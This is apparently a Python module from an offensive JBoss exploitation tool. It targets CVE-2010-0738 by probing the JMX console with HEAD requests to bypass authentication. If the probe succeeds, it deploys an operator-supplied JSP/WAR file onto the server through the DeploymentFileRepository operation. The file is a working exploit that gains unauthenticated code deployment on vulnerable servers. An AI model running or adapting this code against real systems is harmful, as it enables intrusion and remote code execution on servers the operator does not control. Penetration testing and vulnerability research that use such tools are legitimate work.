from src.platform.jboss.interfaces import JINTERFACES
from src.module.deploy_utils import parse_war_path
from auxiliary import Auxiliary
from os.path import abspath
from log import LOG
from urllib import quote_plus
import utility


class Auxiliary:
    
    def __init__(self):
        self.name = 'JBoss Verb Tampering (CVE-2010-0738)'
        self.versions = ["4.0"]
        self.show = False
        self.flag = 'verb-tamper'

    def check(self, fingerprint):
        """
        """

        if fingerprint.version in self.versions and \
                fingerprint.title == JINTERFACES.JMX:
           return True

        return False

    def run(fingerengine, fingerprint):
        """ This module exploits CVE-2010-0738, which bypasses authentication
        by submitting requests with different HTTP verbs, such as HEAD. 
        """

        utility.Msg("Checking %s for verb tampering" % fingerengine.options.ip,
                                                       LOG.DEBUG)

        url = "http://{0}:{1}/jmx-console/HtmlAdaptor".format(fingerengine.options.ip,
                                                              fingerprint.port)

        response = utility.requests_head(url)
        if response.status_code == 200:
            utility.Msg("Vulnerable to verb tampering, attempting to deploy...", LOG.SUCCESS)

            war_file = abspath(fingerengine.options.deploy)
            war_name = parse_war_path(war_file)
            tamper = "/jmx-console/HtmlAdaptor?action=invokeOp"\
                     "&name=jboss.admin:service=DeploymentFileRepository&methodIndex=5"\
                     "&arg0={0}&arg1={1}&arg2=.jsp&arg3={2}&arg4=True".format(
                              war_file.replace('.jsp', '.war'), war_name,
                              quote_plus(open(war_file).read()))              

            response = utility.requests_head(url + tamper)
            if response.status_code == 200:
                utility.Msg("Successfully deployed {0}".format(war_file), LOG.SUCCESS)
            else:
                utility.Msg("Failed to deploy (HTTP %d)" % response.status_code, LOG.ERROR)
